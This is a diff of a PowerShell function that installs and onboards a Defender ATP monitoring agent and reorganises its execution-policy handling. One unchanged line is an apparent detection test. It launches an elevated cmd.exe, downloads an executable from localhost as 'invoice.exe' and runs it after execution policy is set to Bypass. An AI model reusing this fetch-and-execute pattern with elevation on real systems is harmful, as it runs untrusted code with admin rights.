@@ -62,6 +62,8 @@ function Install-MDATPAgent {
 
     begin {
         Write-Host -ForegroundColor Green "Starting MMA configuration process"
+        $oldExecutionPolicy = Get-ExecutionPolicy
+        Set-ExecutionPolicy -ExecutionPolicy Bypass -ErrorAction Stop
     }
 
     process {
@@ -94,9 +96,7 @@ function Install-MDATPAgent {
             Start-Process -Filepath "$FilePathToExtract\Setup.exe" -ArgumentList $cmdArguements -Wait -ErrorAction Stop
 
             Write-Host -ForegroundColor Green "Running onboarding detection script.Results should show up in your admin portal within a few minutes."
-            Set-ExecutionPolicy Bypass
-            $oldErrorPreferences = $ErrorActionPreference
-            $ErrorActionPreference = 'SilentlyContinue'
+           
             Start-Process -FilePath "C:\Windows\System32\cmd.exe" -verb runas -ArgumentList { /c (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe'); Start-Process 'C:\\test-WDATP-test\\invoice.exe' }
         }
         catch {
@@ -112,7 +112,6 @@ function Install-MDATPAgent {
                 Start-Service -Name HealthService
             }
 
-            $ErrorActionPreference = $oldErrorPreferences
             Stop-Transcript
         }
         catch {
@@ -121,6 +120,7 @@ function Install-MDATPAgent {
     }
 
     end {
+        Set-ExecutionPolicy -ExecutionPolicy $oldExecutionPolicy -ErrorAction Stop
         Write-Host -ForegroundColor Green "Completed MMA configuration process. Logging saved to $(Join-Path -Path $LoggingPath -ChildPath $LoggingFile)"
     }
 }
